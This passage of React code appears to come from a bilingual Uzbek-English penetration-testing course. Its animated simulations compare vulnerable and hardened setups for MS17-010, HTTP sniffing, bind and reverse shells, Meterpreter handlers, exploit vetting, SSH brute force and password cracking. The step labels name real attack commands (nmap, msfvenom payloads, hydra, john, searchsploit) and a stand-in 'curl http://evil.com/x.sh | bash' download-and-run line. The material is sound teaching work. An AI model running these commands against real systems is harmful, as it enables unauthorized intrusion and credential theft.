    {col:BL,uz:"nmap --script smb-vuln-ms17-010 -p445 10.0.0.9 — SMBv1 o'chirilgan, faqat SMBv2/3",en:"nmap --script smb-vuln-ms17-010 -p445 10.0.0.9 — SMBv1 disabled, only SMBv2/3",duz:"Xuddi shu skript, xuddi shu buyruq.",den:"The exact same script, the exact same command."},
    {col:AM,uz:"Natija: NOT VULNERABLE — zaif protokol umuman javob bermaydi",en:"Result: NOT VULNERABLE — the weak protocol doesn't even respond",duz:"SMBv1 o'zi mavjud bo'lmagani uchun kamchilikning o'zi yo'q.",den:"With SMBv1 simply absent, the flaw has nothing to live in."},
    {col:AM,uz:"Metasploit moduli muvaffaqiyatsiz — SMBv1 mavjud emas",en:"The Metasploit module fails — SMBv1 doesn't exist to exploit",duz:"Eng mashhur exploit ham ishlaydigan nishonsiz foydasiz.",den:"Even the most famous exploit is useless without a target to work on."},
    {col:A,uz:"🛡 2017-yildan beri ma'lum bo'lgan hujum bekor — bitta yangilanish yetarli edi",en:"🛡 An attack known since 2017 neutralized — one update was enough",duz:"Muntazam yamash (patching) bu darajadagi hujumni butunlay yo'qqa chiqaradi.",den:"Regular patching wipes out an attack of this magnitude entirely.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="vuln"?VULN:PATCHED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="vuln"?VULN:run==="patched"?PATCHED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu MS17-010 tekshiruvini zaif va yangilangan SMB'da sinang.","⬇ Pick a scenario — run the same MS17-010 check against vulnerable and patched SMB.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="vuln"?t(lang,"✗ SMBv1: butun tizim bir buyruqda egallandi","✗ SMBv1: the whole system taken over in one command"):t(lang,"✓ SMBv2/3: eng mashhur exploit ham ishlamaydi","✓ SMBv2/3: even the most famous exploit fails")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("vuln");setStep(-1);},style:{flex:1,padding:"9px",background:run==="vuln"?D+"22":SL2,color:run==="vuln"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ SMBv1 (patch qilinmagan)","☠ SMBv1 (unpatched)")),
      React.createElement("button",{onClick:()=>{setRun("patched");setStep(-1);},style:{flex:1,padding:"9px",background:run==="patched"?A+"22":SL2,color:run==="patched"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🛡 SMBv2/3 (yangilangan)","🛡 SMBv2/3 (patched)"))));
}

function ProtocolCaptureSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const HTTPF=[
    {col:BL,uz:"Follow → TCP Stream — HTTP suhbati ochiladi",en:"Follow → TCP Stream — an HTTP conversation opens",duz:"Butun suhbat bitta o'qilishi mumkin matn sifatida ko'rinadi.",den:"The whole conversation appears as one readable block of text."},
    {col:AM,uz:"So'rov matni to'liq o'qiladi: POST /login HTTP/1.1",en:"The request text reads in full: POST /login HTTP/1.1",duz:"Sarlavhalar ham, tana ham ochiq matn.",den:"Both headers and body are plain text."},
    {col:AM,uz:"Body qismida: username=admin&password=SuperSecret123",en:"In the body: username=admin&password=SuperSecret123",duz:"Hech qanday shifrlash yo'q — baytlar aynan shu ko'rinishda tarmoqdan o'tgan.",den:"No encryption at all — these are the exact bytes that crossed the wire."},
    {col:D,uz:"🔓 Parol ochiq matnda — Wireshark uni to'g'ridan-to'g'ri ko'rsatadi",en:"🔓 The password is in plaintext — Wireshark shows it directly",duz:"Buni ushlab turgan har kim parolni o'qiy oladi.",den:"Anyone capturing this traffic can simply read the password.",final:true,bad:true}
  ];
  const HTTPSF=[
    {col:BL,uz:"Follow → TCP Stream — HTTPS suhbatini ochishga urinish",en:"Follow → TCP Stream — attempting to open an HTTPS conversation",duz:"Xuddi shu buyruq, xuddi shu login shakli.",den:"The exact same action, the exact same login form."},
    {col:AM,uz:"TLS handshake ko'rinadi (Client Hello, sertifikat) — bu shifrlash SOZLAMASI",en:"The TLS handshake is visible (Client Hello, certificate) — this is the encryption SETUP",duz:"Handshake'ning o'zi shifrlanmagan, lekin mazmunni oshkor qilmaydi.",den:"The handshake itself is unencrypted, but it reveals no content."},
    {col:AM,uz:"Application Data: faqat tasodifiy ko'ringan baytlar",en:"Application Data: just random-looking bytes",duz:"«username» yoki «password» so'zi hech qayerda ko'rinmaydi.",den:"The words «username» or «password» appear nowhere."},
    {col:A,uz:"🔒 Parol umuman ko'rinmaydi — shifrlash mazmunni yashiradi",en:"🔒 The password never becomes visible — encryption hides the content",duz:"Ushlab turgan kishi trafikni ko'radi, lekin uni o'qiy olmaydi.",den:"Whoever captures this traffic sees it, but cannot read it.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="http"?HTTPF:HTTPSF;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="http"?HTTPF:run==="https"?HTTPSF:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu login jarayonini HTTP va HTTPS'da Follow Stream bilan solishtiring.","⬇ Pick a scenario — compare Follow Stream on the exact same login over HTTP versus HTTPS.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="http"?t(lang,"✗ HTTP: parol Wireshark'da ochiq o'qiladi","✗ HTTP: the password reads in plain sight in Wireshark"):t(lang,"✓ HTTPS: parol hech qachon ochilmaydi","✓ HTTPS: the password never gets exposed")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("http");setStep(-1);},style:{flex:1,padding:"9px",background:run==="http"?D+"22":SL2,color:run==="http"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔓 HTTP (shifrlanmagan)","🔓 HTTP (unencrypted)")),
      React.createElement("button",{onClick:()=>{setRun("https");setStep(-1);},style:{flex:1,padding:"9px",background:run==="https"?A+"22":SL2,color:run==="https"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 HTTPS (shifrlangan)","🔒 HTTPS (encrypted)"))));
}

function ShellConnectSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const BIND=[
    {col:BL,uz:"Nishonda: exploit ishga tushadi, port 4444 ochiladi va ulanish kutiladi",en:"On the target: the exploit runs, port 4444 opens and WAITS for a connection",duz:"Nishon endi «server» rolida — kimdir ulanishini kutadi.",den:"The target now plays «server» — waiting for someone to connect."},
    {col:AM,uz:"Hujumchi: nishonning 4444-portiga ulanishga urinadi (INBOUND)",en:"Attacker: tries to connect INBOUND to the target's port 4444",duz:"Bu — tashqaridan ichkariga kirish yo'nalishi.",den:"This is an outside-to-inside direction."},
    {col:AM,uz:"Korporativ firewall: kiruvchi ulanishlarni standart bo'yicha BLOKLAYDI",en:"Corporate firewall: blocks inbound connections by default",duz:"Deyarli har qanday zamonaviy tarmoq shu qoidaga amal qiladi.",den:"Almost every modern network follows this rule."},
    {col:D,uz:"🚫 Ulanish rad etildi — firewall hech qachon o'tkazmadi",en:"🚫 Connection refused — the firewall never let it through",duz:"Exploit'ning o'zi ishlagan bo'lsa ham, natija olinmadi.",den:"Even though the exploit itself worked, no result was obtained.",final:true,bad:true}
  ];
  const REVERSE=[
    {col:BL,uz:"Nishonda: exploit ishga tushadi, DARHOL hujumchiga ulanishga harakat qiladi",en:"On the target: the exploit runs and IMMEDIATELY tries to connect back to the attacker",duz:"Nishon endi «klient» rolida — tashqariga chiqishga harakat qiladi.",den:"The target now plays «client» — trying to reach out."},
    {col:AM,uz:"Bu — chiquvchi (OUTBOUND) ulanish, xuddi brauzer saytga ulangandek",en:"This is an OUTBOUND connection, just like a browser reaching a website",duz:"Tashqi ko'rinishi oddiy veb-so'rovdan farq qilmaydi.",den:"On the surface it looks no different from an ordinary web request."},
    {col:AM,uz:"Korporativ firewall: chiquvchi trafikni odatda ochiq qoldiradi (ish uchun kerak)",en:"Corporate firewall: usually leaves outbound traffic open (needed for work)",duz:"Xodimlar internetga chiqishi kerak — bu qoidani qattiqlashtirish qiyin.",den:"Employees need internet access — this rule is hard to lock down."},
    {col:A,uz:"✅ Ulanish o'tdi — Meterpreter sessiyasi ochildi",en:"✅ The connection got through — a Meterpreter session opened",duz:"Bir xil exploit, faqat ulanish yo'nalishi teskari — va bu yetarli edi.",den:"The same exploit, just the connection direction reversed — and that was enough.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="bind"?BIND:REVERSE;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="bind"?BIND:run==="reverse"?REVERSE:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu exploit korporativ firewall ortida qanday farq bilan ishlashini ko'ring.","⬇ Pick a scenario — see how the exact same exploit fares differently behind a corporate firewall.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="bind"?t(lang,"✗ Bind shell: kiruvchi ulanish bloklandi","✗ Bind shell: the inbound connection was blocked"):t(lang,"✓ Reverse shell: chiquvchi ulanish o'tdi","✓ Reverse shell: the outbound connection got through")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("bind");setStep(-1);},style:{flex:1,padding:"9px",background:run==="bind"?D+"22":SL2,color:run==="bind"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🚫 Bind shell","🚫 Bind shell")),
      React.createElement("button",{onClick:()=>{setRun("reverse");setStep(-1);},style:{flex:1,padding:"9px",background:run==="reverse"?A+"22":SL2,color:run==="reverse"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Reverse shell","✅ Reverse shell"))));
}

function PayloadHandlerSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const MISMATCH=[
    {col:BL,uz:"msfvenom bilan windows/x64/meterpreter/reverse_tcp (STAGED) yaratildi",en:"A STAGED windows/x64/meterpreter/reverse_tcp payload is generated with msfvenom",duz:"Eslatma: nomida slesh (/) bor — bu staged.",den:"Note: the name has a slash (/) — that's staged."},
    {col:AM,uz:"Handler'da: set payload windows/x64/meterpreter_reverse_tcp — pastki chiziq bilan (xato!)",en:"In the handler: set payload windows/x64/meterpreter_reverse_tcp — with an underscore (a mistake!)",duz:"Bitta belgi farqi — lekin bu butunlay boshqa payload turi.",den:"One character different — but it's a completely different payload type."},
    {col:AM,uz:"Nishonda ishga tushirilganda: dastlabki stage yuboriladi, lekin handler uni tushunmaydi",en:"When run on the target: the initial stage is sent, but the handler doesn't understand it",duz:"Ikki tomon boshqa-boshqa «tilda» gaplashmoqda.",den:"The two sides are speaking different «protocols»."},
    {col:D,uz:"❌ Ulanish darhol uziladi — sessiya ochilmaydi",en:"❌ The connection drops immediately — no session opens",duz:"msfvenom'ning o'zi to'g'ri ishlagan bo'lsa ham, mos kelmaslik hammasini buzadi.",den:"Even though msfvenom itself worked correctly, the mismatch breaks everything.",final:true,bad:true}
  ];
  const MATCH=[
    {col:BL,uz:"msfvenom bilan windows/x64/meterpreter/reverse_tcp (STAGED) yaratildi",en:"The exact same STAGED windows/x64/meterpreter/reverse_tcp payload is generated",duz:"Xuddi shu payload, xuddi shu buyruq.",den:"The exact same payload, the exact same command."},
    {col:AM,uz:"Handler'da: set payload windows/x64/meterpreter/reverse_tcp — msfvenom bilan AYNAN bir xil",en:"In the handler: set payload windows/x64/meterpreter/reverse_tcp — EXACTLY matching msfvenom",duz:"Harfma-harf, sleshigacha bir xil qatorlar.",den:"Character for character, down to the slashes — identical strings."},
    {col:AM,uz:"Nishonda ishga tushirilganda: stage yuboriladi, handler uni to'g'ri kutib oladi",en:"When run on the target: the stage is sent, and the handler receives it correctly",duz:"Ikki tomon bir xil «tilda» gaplashmoqda.",den:"Both sides speak the same «protocol»."},
    {col:A,uz:"✅ Meterpreter sessiyasi muvaffaqiyatli ochiladi",en:"✅ A Meterpreter session opens successfully",duz:"Payload nomi — belgisiga qadar mos kelishi shart bo'lgan «kalit».",den:"The payload name is a «key» that must match down to the last character.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="mismatch"?MISMATCH:MATCH;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="mismatch"?MISMATCH:run==="match"?MATCH:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu payload handler'dagi nom bilan mos kelganda va kelmaganda nima bo'lishini ko'ring.","⬇ Pick a scenario — see what happens when the same payload's name matches the handler versus when it doesn't.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="mismatch"?t(lang,"✗ Mos kelmagan nom: staged/stageless chalkashtirildi","✗ Mismatched name: staged/stageless got mixed up"):t(lang,"✓ Aniq mos nom: sessiya muvaffaqiyatli ochildi","✓ Exact match: the session opened successfully")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("mismatch");setStep(-1);},style:{flex:1,padding:"9px",background:run==="mismatch"?D+"22":SL2,color:run==="mismatch"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Mos kelmagan payload","❌ Mismatched payload")),
      React.createElement("button",{onClick:()=>{setRun("match");setStep(-1);},style:{flex:1,padding:"9px",background:run==="match"?A+"22":SL2,color:run==="match"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Aniq mos payload","✅ Exact-match payload"))));
}

function ExploitVerifySim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const BLIND=[
    {col:BL,uz:"searchsploit -m 50383 — exploit joriy papkaga nusxalanadi",en:"searchsploit -m 50383 — the exploit is copied to the current folder",duz:"Kod hali bir marta ham o'qilmagan.",den:"The code hasn't been read even once yet."},
    {col:AM,uz:"python3 50383.py <target> — kodni o'qimasdan darhol ishga tushiriladi",en:"python3 50383.py <target> — run immediately without reading it",duz:"«Nomiga qarab ishonish» — xavfli odat.",den:"«Trusting it by name alone» is a dangerous habit."},
    {col:AM,uz:"Skript fonda /tmp/.hidden/backdoor.sh yuklab, ishga tushiradi",en:"In the background, the script downloads and runs /tmp/.hidden/backdoor.sh",duz:"Bu — asl zaiflikka hech qanday aloqasi bo'lmagan qo'shimcha kod.",den:"This is extra code with no relation to the real vulnerability at all."},
    {col:D,uz:"☠ «Exploit» sizning Kali'ingizni zararladi — hujumchi qurbon bo'ldi",en:"☠ The «exploit» infected your own Kali — the attacker became the victim",duz:"Exploit-DB'da har narsa tekshirilgan emas — noma'lum yuklamalar xavfli.",den:"Not everything on Exploit-DB is vetted — unverified downloads are risky.",final:true,bad:true}
  ];
  const VERIFIED=[
    {col:BL,uz:"searchsploit -x 50383.py — kod terminalda ochiladi, o'qish uchun",en:"searchsploit -x 50383.py — the code opens in the terminal for reading",duz:"Hech narsa ishga tushirilmadi — faqat o'qildi.",den:"Nothing was executed yet — only read."},
    {col:AM,uz:"Kod ichida kutilmagan tarmoq so'rovi topiladi: curl http://evil.com/x.sh | bash",en:"An unexpected network call is spotted inside the code: curl http://evil.com/x.sh | bash",duz:"Bu qator zaiflikni ekspluatatsiya qilish bilan hech qanday aloqasi yo'q.",den:"This line has nothing to do with exploiting the actual vulnerability."},
    {col:AM,uz:"Bu — asl zaiflik bilan bog'liq emas, alohida zararli qo'shimcha",en:"This is unrelated to the real vulnerability — a separate malicious add-on",duz:"Haqiqiy exploit kodi ancha soddaroq bo'lishi kerak edi.",den:"The genuine exploit code should have looked much simpler."},
    {col:A,uz:"🔍 O'qib chiqish tuzoqni fosh qildi — kod ishlatilmadi",en:"🔍 Reading it first exposed the trap — the code was never run",duz:"Ishga tushirishdan oldingi bir daqiqalik tekshiruv katta zarardan saqladi.",den:"One extra minute of review before running saved from serious harm.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="blind"?BLIND:VERIFIED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="blind"?BLIND:run==="verified"?VERIFIED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — bitta shubhali exploit'ni ko'r-ko'rona ishga tushirish va avval o'qishni solishtiring.","⬇ Pick a scenario — compare running a suspicious exploit blindly versus reading it first.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="blind"?t(lang,"✗ Ko'r-ko'rona: hujumchi o'zi qurbon bo'ldi","✗ Blindly: the attacker became the victim"):t(lang,"✓ Avval o'qish: tuzoq ishlatilishdan oldin fosh bo'ldi","✓ Reading first: the trap was exposed before it could run")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("blind");setStep(-1);},style:{flex:1,padding:"9px",background:run==="blind"?D+"22":SL2,color:run==="blind"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ Ko'r-ko'rona ishga tushirish","☠ Run it blindly")),
      React.createElement("button",{onClick:()=>{setRun("verified");setStep(-1);},style:{flex:1,padding:"9px",background:run==="verified"?A+"22":SL2,color:run==="verified"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔍 Avval o'qib chiqish","🔍 Read it first"))));
}

function BruteForceDefenseSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const OPEN=[
    {col:BL,uz:"hydra -l admin -P rockyou.txt ssh://10.0.0.5 -t 16 — 16 parallel oqim boshlandi",en:"hydra -l admin -P rockyou.txt ssh://10.0.0.5 -t 16 — 16 parallel threads start",duz:"Hech qanday cheklov yo'qligi sababli maksimal tezlikda ishlaydi.",den:"With no limiting in place, it runs at full speed."},
    {col:AM,uz:"Server har urinishga cheklovsiz javob beradi — soniyasiga 50+ urinish",en:"The server answers every attempt without limit — 50+ tries per second",duz:"SSH daemon'ning o'zida urinish sonini cheklovchi hech narsa yo'q.",den:"The SSH daemon itself has nothing limiting the attempt count."},
    {col:AM,uz:"~14 000-chi urinishda to'g'ri parol topildi",en:"The correct password is found at attempt #~14,000",duz:"rockyou.txt'da bu parol taxminan shu joyda turgan.",den:"In rockyou.txt this password happens to sit around that position."},
    {col:D,uz:"🔓 ~5 daqiqada kirish topildi — hech qanday to'siq yo'q edi",en:"🔓 Access found in ~5 minutes — there was no obstacle at all",duz:"Server o'zini hech qanday himoyasiz to'liq ochiq qoldirgan.",den:"The server left itself completely exposed with no defenses.",final:true,bad:true}
  ];
  const LOCKED=[
    {col:BL,uz:"hydra -l admin -P rockyou.txt ssh://10.0.0.9 -t 16 — xuddi shu hujum boshlandi",en:"hydra -l admin -P rockyou.txt ssh://10.0.0.9 -t 16 — the exact same attack starts",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmadi.",den:"The attacker does nothing differently."},
    {col:AM,uz:"fail2ban: 5 marta muvaffaqiyatsiz urinishdan keyin IP 10 daqiqaga bloklanadi",en:"fail2ban: after 5 failed attempts, the IP is banned for 10 minutes",duz:"Server loglarni real vaqtda kuzatib, muvaffaqiyatsizliklarni sanaydi.",den:"The server watches its logs in real time and counts failures."},
    {col:AM,uz:"Hydra endi ulana olmaydi — «Connection refused», barcha oqimlar to'xtaydi",en:"Hydra can no longer connect — «Connection refused», all threads stall",duz:"Parol lug'atining 99% i hech qachon sinab ko'rilmaydi.",den:"99% of the password wordlist is never even tried."},
    {col:A,uz:"🔒 Faqat 5 urinishdan keyin butunlay to'xtatildi",en:"🔒 Stopped completely after just 5 attempts",duz:"Onlayn hujumning zaif nuqtasi — server sizni ko'rib turadi.",den:"The weak point of an online attack — the server can see you the whole time.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="open"?OPEN:LOCKED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="open"?OPEN:run==="locked"?LOCKED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu Hydra hujumini himoyasiz va fail2ban qo'llagan serverda sinang.","⬇ Pick a scenario — run the same Hydra attack against an unprotected server versus one using fail2ban.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="open"?t(lang,"✗ Himoyasiz: to'liq lug'at cheklovsiz sinaladi","✗ Unprotected: the whole wordlist gets tried unhindered"):t(lang,"✓ fail2ban: onlayn hujum tezda to'xtatiladi","✓ fail2ban: the online attack is stopped fast")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("open");setStep(-1);},style:{flex:1,padding:"9px",background:run==="open"?D+"22":SL2,color:run==="open"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔓 Himoyasiz server","🔓 Unprotected server")),
      React.createElement("button",{onClick:()=>{setRun("locked");setStep(-1);},style:{flex:1,padding:"9px",background:run==="locked"?A+"22":SL2,color:run==="locked"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 fail2ban bilan","🔒 With fail2ban"))));
}

function RulesMutationSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const PLAIN=[
    {col:BL,uz:"john --wordlist=rockyou.txt hashes.txt — qoidasiz oddiy lug'at hujumi",en:"john --wordlist=rockyou.txt hashes.txt — a plain wordlist attack, no rules",duz:"Nishon parol: Password123! (foydalanuvchi «password» so'zidan yasagan).",den:"Target password: Password123! (the user built it from the word «password»)."},
    {col:AM,uz:"rockyou.txt'da «password» so'zi aynan shu ko'rinishda bor — lekin hash boshqacha",en:"rockyou.txt has the word «password» in exactly that form — but the hash is different",duz:"Lug'at so'zni O'ZGARTIRMASDAN, aynan shu holida sinaydi.",den:"The wordlist tries the word UNCHANGED, exactly as it is."},
